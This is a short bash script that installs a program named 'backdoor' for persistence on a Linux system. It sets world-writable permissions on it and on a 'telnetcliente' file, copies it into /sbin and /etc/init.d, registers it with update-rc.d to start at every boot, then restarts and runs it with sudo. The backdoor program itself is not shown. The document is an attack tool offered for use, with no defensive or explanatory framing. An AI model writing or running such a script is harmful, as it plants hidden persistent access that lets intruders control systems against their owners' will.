#!/bin/bash
chmod 777 backdoor
chmod 777 telnetcliente
cp backdoor /sbin
cp backdoor /etc/init.d/backdoor
update-rc.d backdoor start
update-rc.d backdoor defaults
sudo /etc/init.d/backdoor restart
sudo backdoor
